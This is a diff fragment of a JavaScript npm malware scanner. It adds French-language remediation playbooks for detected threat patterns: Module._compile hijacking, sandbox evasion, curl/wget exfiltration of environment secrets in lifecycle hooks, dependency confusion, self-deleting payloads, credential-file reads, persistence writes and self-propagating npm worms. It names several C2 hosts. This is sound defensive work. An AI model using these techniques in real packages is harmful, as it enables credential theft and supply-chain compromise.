+    'Un seul fichier suspect parmi de nombreux fichiers propres. Pattern de dissimulation typique ' +
+    'ou le code malveillant est cache dans un package apparemment legitime. Examiner le fichier suspect en detail.',
+
+  deep_suspicious_file:
+    'Pattern suspect dans un fichier profondement imbrique. Technique pour echapper aux analyses superficielles. ' +
+    'Verifier le contenu du fichier et son role dans l\'arborescence du package.',
+
+  // Blue Team v8b playbooks
+  module_internals_hijack:
+    'CRITIQUE: Assignation a Module._resolveFilename/_compile/_extensions. Detournement du systeme de modules Node.js. ' +
+    'Tous les require() sont interceptes. Supprimer le package immediatement. Auditer tous les modules charges apres installation.',
+
+  json_reviver_pollution:
+    'HAUTE: JSON.parse avec reviver accedant a __proto__/prototype. Pollution de prototype via JSON. ' +
+    'Ne jamais passer de JSON non fiable avec un reviver manipulant __proto__. Verifier les sources de donnees JSON.',
+
+  vm_dynamic_code:
+    'CRITIQUE: vm.runInContext/compileFunction avec code construit dynamiquement. Evasion de sandbox. ' +
+    'Verifier d\'ou provient le code execute. Bloquer l\'acces au module vm. Supprimer si non justifie.',
+
+  callback_exec_rce:
+    'CRITIQUE: exec/spawn dans callback .on(\'message\'|\'data\'). Execution de commandes depuis flux reseau. ' +
+    'Pattern C2: commandes recues par WebSocket/TCP executees via child_process. Supprimer immediatement.',
+
+  stego_binary_exec:
+    'CRITIQUE: Lecture de fichier image/binaire + eval/Function. Payload steganographique. ' +
+    'Verifier le contenu du fichier image. Scanner avec des outils stego. Supprimer le fichier et le code d\'extraction.',
+
+  asynclocal_context_exec:
+    'HAUTE: AsyncLocalStorage + execution dynamique. Code malveillant cache dans un contexte async. ' +
+    'Examiner les callbacks AsyncLocalStorage. Verifier ce qui est stocke et execute dans le store.',
+
+  prototype_chain_constructor:
+    'CRITIQUE: Object.getPrototypeOf(var).constructor stocke dans une variable. Traversee de prototype pour Function. ' +
+    'Technique d\'evasion avancee. Supprimer le code. Verifier si le constructeur est appele avec du code dynamique.',
+
+  ci_environment_probe:
+    'HAUTE: Detection de 3+ fournisseurs CI (GitHub Actions, GitLab CI, etc.) dans le meme fichier. ' +
+    'Sondage d\'environnement CI pour activation conditionnelle. Verifier la logique conditionnelle associee.',
+
+  lifecycle_missing_script:
+    'CRITIQUE: Script lifecycle reference un fichier inexistant dans le package. Script fantome. ' +
+    'Le payload peut etre injecte dynamiquement ou lors d\'une mise a jour. Installer avec --ignore-scripts. Supprimer le package.',
+
+  trusted_new_unknown_dependency:
+    'CRITIQUE: Package populaire (TRUSTED) a ajoute une dependance inconnue ou tres recente (<7 jours). ' +
+    'Indicateur de compromission de compte mainteneur (supply-chain attack). Bloquer la mise a jour. ' +
+    'Verifier le changelog, les commits recents, et contacter le mainteneur. Inspecter la nouvelle dependance.',
+
+  trusted_new_dependency:
+    'HAUTE: Package populaire (TRUSTED) a ajoute une nouvelle dependance connue. ' +
+    'Verifier le changelog et la legitimite de l\'ajout. Pas de blocage immediat mais surveillance renforcee.',
+
+  // v2.10.89: Security review findings (apr-2026)
+  curl_env_exfil:
+    'CRITIQUE: curl/wget exfiltre les variables d\'environnement ou des donnees systeme via lifecycle script. ' +
+    'Machine potentiellement compromise si deja installe. Rotation immediate de TOUS les secrets ' +
+    '(npm tokens, AWS keys, GitHub tokens, etc.). Verifier les connexions sortantes recentes.',
+
+  function_constructor_require:
+    'CRITIQUE: new Function.constructor("require", code) — execution de code dynamique avec acces au require reel. ' +
+    'Le code telecharge probablement un payload depuis un C2 (jsonkeeper.com, npoint.io, etc.) et l\'execute. ' +
+    'Isoler la machine. Supprimer le package. Regenerer TOUS les secrets.',
+
+  process_variable_shadow:
+    'ELEVE: Le global process est shadow par une variable locale pour cacher des URLs C2 dans process.env. ' +
+    'Technique d\'evasion de la campagne "Robert King" (npoint.io/jsonkeeper.com). ' +
+    'Verifier les URLs dans les valeurs de la fausse variable process. Supprimer le package.',
+
+  newsletter_auto_follow:
+    'ELEVE: Fork Baileys malveillant qui force l\'abonnement a des channels WhatsApp via la session authentifiee. ' +
+    'Les JIDs des channels sont hardcodes ou telecharges depuis un C2 (cdn.malvintech.sbs). ' +
+    'Desinstaller immediatement. Verifier les channels WhatsApp auxquels la session est abonnee. ' +
+    'Revoquer la session WhatsApp Web si compromise.',
+
+  version_99_preinstall:
+    'ELEVE: Version >= 99.x.x avec hook lifecycle — indicateur de dependency confusion. ' +
+    'La version elevee force npm a resoudre vers le package public au lieu du package interne prive. ' +
+    'NE PAS installer. Configurer un registry scope pour les packages internes. ' +
+    'Signaler le package sur npm comme dependency confusion.',
+
+  lifecycle_newsletter_hijack:
+    'CRITIQUE: Lifecycle hook + newsletter auto-follow WhatsApp — channel hijack a l\'installation. ' +
+    'Desinstaller immediatement. Revoquer la session WhatsApp Web. ' +
+    'Verifier les channels auxquels la session est abonnee.',
+
+  lifecycle_env_exfil:
+    'CRITIQUE: Lifecycle hook + exfiltration env via curl/wget a l\'installation. ' +
+    'Machine compromise si deja installe. Rotation immediate de TOUS les secrets.',
+
+  self_destruct_eval:
+    'CRITIQUE: Execution dynamique de code (eval/new Function/Module._compile) + auto-suppression du fichier execute (unlinkSync/renameSync sur __filename). ' +
+    'Pattern anti-forensique professionnel: le malware execute son payload obfusque puis efface ses traces. Campagne csec-crypto-toolkit (avril 2026) exfiltre .env, GITHUB_TOKEN, NPM_TOKEN, AWS/SSH keys vers csec-supply-chain-attack.vercel.app, puis unlinkSync(__filename). ' +
+    'Machine compromise si deja installe. Rotation immediate de TOUS les secrets (.env, tokens CI/CD, cles SSH). Verifier les .env des repertoires parents jusqu\'a 6 niveaux. Supprimer le package.',
+
+  function_runtime_args:
+    'CRITIQUE: new Function() appele avec les identifiants runtime Node (require, __dirname, __filename) passes comme arguments string literal + corps dynamique. ' +
+    'Pattern csec-crypto-toolkit: l\'attaquant injecte le contexte Node complet dans un payload obfusque execute en memoire, contournant la detection de require() standard. Aucun package legitime n\'utilise ce pattern. ' +
+    'Lire le contenu de l\'argument body. Tracer la source (souvent XOR/base64 decode). Isoler et supprimer.',
+
+  external_tarball_dep:
+    'CRITIQUE: Dependance declaree avec URL tarball (.tgz/.tar.gz) hebergee hors des registres npm legitimes (github.com, gitlab.com, bitbucket.org, registry.npmjs.org). ' +
+    'Pattern ltidi chain attack (avril 2026): le stub publie sur npm n\'a aucun install hook visible, la charge utile est hebergee sur un cloud storage (GCS, S3, CDN) et contourne entierement l\'audit du registre npm. ' +
+    'Verifier le contenu de la tarball distante avant toute installation. Supprimer le package. Signaler au registre npm.',
+
+  // Sandbox 2026: honey traps + persistence + chain analysis
+  sandbox_honey_read:
+    'CRITIQUE: Le package a lu un fichier decoy plante par la sandbox (.npmrc-decoy, .ssh/id_rsa-decoy, wallet decoy, etc.). ' +
+    'Aucun outil legitime ne lit ces chemins decoy. Indicateur fort de scan aveugle de credentials, meme pour des malwares zero-day. ' +
+    'Isoler la machine. Supprimer le package. Si un decoy a ete exfiltre via HTTP, le canary token apparaitra dans les logs reseau.',
+
+  sandbox_credential_target_read:
+    'ELEVE: Le package a lu un fichier de credentials connu (cloud creds, wallets, browser data, .gnupg, .kube/config). ' +
+    'Pattern PhantomRaven, Shai-Hulud. Verifier la correlation avec une connexion sortante non-registre dans la meme run. ' +
+    'Si le decoy a ete exfiltre (canary detection): rotation immediate de tous les secrets correspondants.',
+
+  sandbox_persistence_write:
+    'CRITIQUE: Le package a ecrit dans un emplacement de persistance (.bashrc, .zshrc, autostart, cron, systemd user, LaunchAgents). ' +
+    'Aucun cas legitime en npm install. Implant probable. ' +
+    'Inspecter le contenu ecrit, le supprimer, isoler la machine, regenerer la session shell.',
+
+  sandbox_execve_chain_depth:
+    'ELEVE: La chaine de processus depasse la profondeur attendue depuis npm install (npm install -> script -> binaire externe). ' +
+    'Pattern Shai-Hulud preinstall worm: install script lance node/sh qui lance curl|wget|bash. ' +
+    'Tracer chaque processus de la chaine, supprimer le package, verifier les fichiers crees dans /tmp et le home.',
+
+  sandbox_npm_self_invoke:
+    'CRITIQUE: Le package invoque npm publish/deprecate/owner/token/access depuis l\'arborescence npm install. ' +
+    'Pattern CanisterWorm self-propagation: le malware utilise le token npm de la machine pour publier des versions backdoorees d\'autres packages mainteneurs par l\'utilisateur. ' +
+    'Isoler immediatement. Revoquer tous les tokens npm. Auditer les versions publiees recemment depuis le compte.',
+
+  sandbox_runtime_deobfuscation_executed:
+    'ELEVE: new Function() ou eval() a execute un body de >500 octets derive d\'une string source obfusquee. ' +
+    'Pattern Axios 2026 OrDeR_7077: XOR + base64 decoded a l\'install puis execute en memoire. ' +
+    'Le statique voit l\'obfuscation, la sandbox confirme l\'execution effective. Lire le contenu deobfusque dans les logs preload, isoler la machine.',
 };
 
 function getPlaybook(threatType) {
